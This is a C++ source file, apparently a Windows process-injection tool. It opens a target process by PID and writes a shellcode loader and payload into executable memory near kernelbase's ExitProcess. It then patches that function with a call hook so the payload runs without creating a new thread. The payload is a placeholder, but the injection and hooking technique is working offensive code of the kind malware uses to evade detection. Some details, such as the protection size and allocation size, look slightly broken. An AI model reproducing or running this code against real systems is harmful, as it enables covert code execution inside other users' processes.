#include <windows.h>

#include <string>
#include <print>

unsigned char shellcode[] = {0x90, 0xcc};

byte shellcodeLoader[] = 
{
    0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
    0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
    0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
    0xE0, 0x90
};

void generateHook(uintptr_t origInstruction) {
    auto instr = reinterpret_cast<byte*>(&origInstruction);
    for (int i = 0; i < 8; ++i) {
        shellcodeLoader[0x12 + i] = instr[i];
    }
}

UINT_PTR findMemoryHole(HANDLE proc, UINT_PTR exportAddr, SIZE_T size) {
    for (UINT_PTR base = (exportAddr & 0xFFFFFFFFFFF70000) - 0x70000000;
         base < exportAddr + 0x70000000;
         base += 0x10000)
    {
        if (VirtualAllocEx(proc, reinterpret_cast<LPVOID>(base), size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ) != nullptr)
            return base;
    }
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::println("Usage: {} <pid>", argv[0]);
        return 1;
    }

    std::string_view targetDll = "kernelbase.dll";
    std::string_view targetApi = "ExitProcess";

    char* endptr = nullptr;
    unsigned int pid = std::strtoul(argv[1], &endptr, 10);
    if (pid == 0) {
        std::println("❌ Invalid PID: {}", argv[1]);
        return 1;
    }

    HMODULE dllHandle = GetModuleHandleA(std::string(targetDll).c_str());
    if (!dllHandle) {
        std::println("❌ Failed to get handle for {}.", targetDll);
        return 1;
    }

    uintptr_t apiAddr = reinterpret_cast<uintptr_t>(
        GetProcAddress(dllHandle, std::string(targetApi).c_str())
    );
    if (!apiAddr) {
        std::println("❌ Failed to find {} in {}.", targetApi, targetDll);
        return 1;
    }

    std::println("✅ Found {} at address {:#x}", targetApi, apiAddr);

    auto procHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

    // find space for shellcode
    UINT_PTR loaderAddr = findMemoryHole(procHandle, apiAddr, sizeof(shellcode));
    if (!loaderAddr) {
        std::println("❌ Unable to locate memory hole.");
        return 1;
    }
    std::println("🟢 Memory hole at {:#x}", loaderAddr);

    // patch loader with real address and build payload
    generateHook(apiAddr);
    SIZE_T loaderSize = sizeof(shellcodeLoader);
    SIZE_T codeSize   = sizeof(shellcode);
    SIZE_T totalSize  = loaderSize + codeSize;

    auto payload = static_cast<byte*>(
        HeapAlloc(GetProcessHeap(), 0, totalSize)
    );
    RtlCopyMemory(payload, shellcodeLoader, loaderSize);
    RtlCopyMemory(payload + loaderSize, shellcode, codeSize);

    // write payload into remote process
    DWORD oldProt = 0;
    VirtualProtectEx(procHandle, reinterpret_cast<LPVOID>(loaderAddr), totalSize,
                     PAGE_EXECUTE_READWRITE, &oldProt);

    SIZE_T written = 0;
    WriteProcessMemory(procHandle, reinterpret_cast<LPVOID>(loaderAddr),
                       payload, totalSize, &written);
    std::println("✅ Wrote {} bytes of payload.", written);

    // build and write the JMP hook
    uintptr_t rel = loaderAddr - apiAddr - 5;
    byte hook[5] = {
        0xE8,
        static_cast<byte>( rel        & 0xFF),
        static_cast<byte>((rel >>  8) & 0xFF),
        static_cast<byte>((rel >> 16) & 0xFF),
        static_cast<byte>((rel >> 24) & 0xFF)
    };

    DWORD oldProtect;
    VirtualProtectEx(procHandle, (LPVOID)apiAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);

    WriteProcessMemory(procHandle, reinterpret_cast<LPVOID>(apiAddr),
                       hook, sizeof(hook), &written);
    std::println("✅ Hook installed at {:#x}", apiAddr);

    std::println("🕒 Waiting for the hooked API to be called…");
    // …your polling or synchronization logic here…

    return 0;
}